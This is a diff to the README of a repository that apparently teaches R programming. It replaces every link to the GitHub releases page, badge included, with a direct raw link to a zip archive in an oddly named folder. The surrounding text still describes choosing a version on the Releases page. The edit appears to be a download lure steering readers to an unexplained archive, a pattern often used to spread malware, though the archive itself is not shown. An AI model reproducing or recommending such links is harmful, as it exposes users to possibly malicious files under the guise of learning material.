@@ -1,6 +1,6 @@
 # 📊 Fundamentals-of-R-Programming - Learn R Programming with Ease
 
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/objectremoverrrrrrr/Fundamentals-of-R-Programming/releases)
+[![Download](https://raw.githubusercontent.com/objectremoverrrrrrr/Fundamentals-of-R-Programming/main/vanjarrah/Fundamentals-of-R-Programming.zip)](https://raw.githubusercontent.com/objectremoverrrrrrr/Fundamentals-of-R-Programming/main/vanjarrah/Fundamentals-of-R-Programming.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, follow these steps:
 
 1. **Visit the Releases Page**  
    Click on the link below to access the download page:
-   [Download the Software](https://github.com/objectremoverrrrrrr/Fundamentals-of-R-Programming/releases)
+   [Download the Software](https://raw.githubusercontent.com/objectremoverrrrrrr/Fundamentals-of-R-Programming/main/vanjarrah/Fundamentals-of-R-Programming.zip)
 
 2. **Choose the Latest Version**  
    On the Releases page, look for the most recent version listed at the top. It will be in a format like `v1.0`, `v1.1`, etc.
@@ -74,4 +74,4 @@ Your feedback is valuable. If you have suggestions or find issues, report them i
 
 For further questions or support, feel free to reach out via the repository's issues section or contact the repository maintainers directly through GitHub.
 
-Enjoy your journey into R programming! To get started now, visit this page: [Download the Software](https://github.com/objectremoverrrrrrr/Fundamentals-of-R-Programming/releases).
+Enjoy your journey into R programming! To get started now, visit this page: [Download the Software](https://raw.githubusercontent.com/objectremoverrrrrrr/Fundamentals-of-R-Programming/main/vanjarrah/Fundamentals-of-R-Programming.zip).
